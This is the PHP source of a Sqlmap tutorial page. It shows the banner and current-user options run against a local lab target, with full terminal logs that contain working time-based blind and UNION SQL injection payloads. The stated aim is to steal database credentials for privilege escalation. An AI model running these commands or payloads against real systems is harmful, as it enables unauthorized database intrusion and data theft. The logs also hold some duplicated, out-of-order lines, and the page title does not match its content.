<?php
    require_once 'relative_init.php';
    include_once SHARED_PATH . 'course_header.php';
    
    // Title and description are set in page_header.php
    $title = "Sqlmap Basic Commands";
    $description = "How to get help in Sqlmap.";
    include_once SHARED_PATH . 'page_header.php';

    // Legal disclaimer and terminal animations
    $terminal_text = 'sudo apt-get install -y python3';
    include SHARED_PATH . 'terminal_text.php';
    include_once SHARED_PATH . 'legal_disclaimer.php';
    $terminal_text = 'python3 --version';
    include SHARED_PATH . 'terminal_text.php';

    // Tutorial navigation buttons
    $previous = 'change-the-http-user-agent.php';
    $home = 'sqlmap-course-home.php#tutorials';
    $next = 'stealing-dbms-usernames-and-passwords.php';
    include SHARED_PATH . 'tutorial_navigation.php';

    // Table of contents
    include SHARED_PATH . 'table_of_contents.php';
?>

    <div class="course-top-level-container">
      <h1 class="title toc">Introduction</h1>
      <p>
        Whether you want to gain persistent access to a database, escelate
        priveledges, or steal information from another table unrelated to
        the SQL vulnerable application, stealing the database usernames and
        passwords can be an important next step.
      </p>
      <p>
        In this section we will be covering the command line arguments seen below.
        Read on to learn about their behavior and see their output.
        <span class="red-text bold">Note:</span> for these commands to work two
        things must happen first. Firstly, there needs an SQL vulnerability, and
        secondly, Sqlmap has to be able to find and exploit the vulnerability.
        Executing these commands against a secure website will not work.
      </p>
      
<pre class="lang-bash default-code-style dark-mode-background">
  -b, --banner            Retrieve DBMS banner
      --current-user      Retrieve DBMS current user
      --passwords         Enumerate DBMS users password hashes</pre>
      
      <h1 class="title toc">Retrieve DBMS banner</h1>
      <p>
        The database banner commonly holds information such as the type and version
        of the database management system, and the patch level. This information
        can be useful for looking up additional exploites in an exploit database.
      </p>
      <p>
        To retrieve the banner, add the argument <span class="inline-code">
        &ndash;&ndash;banner</span> to a Sqlmap command.
      </p>
<pre class="lang-bash default-code-style dark-mode-background">
kali@kali:~$ python3 sqlmap.py -u http://127.0.0.1/ <mark>--banner</mark> --forms --batch --random-agent

[09:29:04] [INFO] fetched random HTTP User-Agent header value 
           'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.0 (.NET CLR 3.5.30729)'
           from file 'C:\Users\Owner\Desktop\sqlmap-dev\data\txt\user-agents.txt'
[09:29:04] [INFO] testing connection to the target URL
[09:29:05] [INFO] searching for forms
[1/1] Form:
POST http://127.0.0.1/
POST data: filter=
do you want to test this form? [Y/n/q]
> Y
Edit POST data [default: filter=] (Warning: blank fields detected): filter=
do you want to fill blank fields with random values? [Y/n] Y
[09:29:06] [INFO] resuming back-end DBMS 'mysql'
[09:29:06] [INFO] using '\***\***\sqlmap\output\results-01172023_0929am.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: filter (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: filter=QLcL' AND (SELECT 6621 FROM (SELECT(SLEEP(5)))rTCo) AND 'qjDb'='qjDb

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: filter=QLcL' UNION ALL SELECT CONCAT(0x71786a7871,0x6c79556b626c706275595a5a5552595a7172686d756e437a5762626e6e6b736a496e474b42654d68,0x71786b6271),27-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[09:29:06] [INFO] the back-end DBMS is MySQL
[09:29:06] [INFO] fetching banner
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
<mark>banner: '10.3.34-MariaDB-0+deb10u1'</mark></pre>
      
      <p>
        Near the bottom of the output we see that the database management system
        is <span class="inline-code">MySQL</span>, specifically <span class="inline-code">
        MariaDB</span> which is  a popular MySQL fork, the version of MariaDB is 
        <span class="inline-code">10.3.34</span>, and the specific version of the 
        MariaDB 10.3.34 package is <span class="inline-code">deb10u1</span>.
      </p>
      <p>
        Simply Googling <span class="inline-code">10.3.34-MariaDB-0+deb10u1</span>
        populates the first page of results with security vulnerabilities and
        exploits that work against this specific version of MySQL.
      </p>
      
      <h1 class="title toc">Retrieve DBMS current user</h1>
      <p>
        This option allows us to see the username of the database user that is
        making database queries on behalf of the exploitable website. Add the
        <span class="inline-code">&ndash;&ndash;current-user</span> argument
        to your Sqlmap command to get the current user.
      </p>

<pre class="lang-bash default-code-style dark-mode-background">
kali@kali:~$ python3 sqlmap.py -u http://127.0.0.1/ <mark>--current-user</mark> --forms --batch --random-agent

[09:47:02] [INFO] fetched random HTTP User-Agent header value 
           'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.6) Gecko/20100118 Gentoo Firefox/3.5.6' 
           from file 'C:\Users\Owner\Desktop\sqlmap-dev\data\txt\user-agents.txt'
[09:47:02] [INFO] testing connection to the target URL
[09:47:02] [INFO] searching for forms
[09:29:04] [INFO] testing connection to the target URL
[09:29:05] [INFO] searching for forms
[1/1] Form:
POST http://127.0.0.1/
POST data: filter=
do you want to test this form? [Y/n/q]
> Y
Edit POST data [default: filter=] (Warning: blank fields detected): filter=
do you want to fill blank fields with random values? [Y/n] Y
[09:47:02] [INFO] resuming back-end DBMS 'mysql'
[09:47:02] [INFO] using '\***\***\sqlmap\output\results-01172023_0947am.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: filter (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: filter=QLcL' AND (SELECT 6621 FROM (SELECT(SLEEP(5)))rTCo) AND 'qjDb'='qjDb

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: filter=QLcL' UNION ALL SELECT CONCAT(0x71786a7871,0x6c79556b626c706275595a5a5552595a7172686d756e437a5762626e6e6b736a496e474b42654d68,0x71786b6271),27-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[09:47:02] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[09:47:02] [INFO] fetching current user
<mark>current user: 'sql_inject@localhost'</mark></pre>

      <p>
        Sqlmap detected the database current user is <span class="inline-code">
        sql_inject@localhost</span>. This means that the username is <span class="inline-code">
        sql_inject</span>. The part of the current user that comes after the 
        <span class="inline-code">@</span> will either be an IP address or a FQDN
        pointing to the server that the website's database is running on. In this
        case the database is running on <span class="inline-code">localhost</span>
        which means that the database is running on the same server as the
        website.
      </p>

    </div>

    <?php include SHARED_PATH . 'tutorial_navigation.php'; ?>
    <div class="course-top-level-container">
    <?php
        $tags = array(
            'Sqlmap',
            'Python3',
            'Debian Linux',
            'Bash'
        );
        
        generate_technology_tags($tags);
    ?>
    </div>

<?php require_once SHARED_PATH . 'page_footer.php'; ?>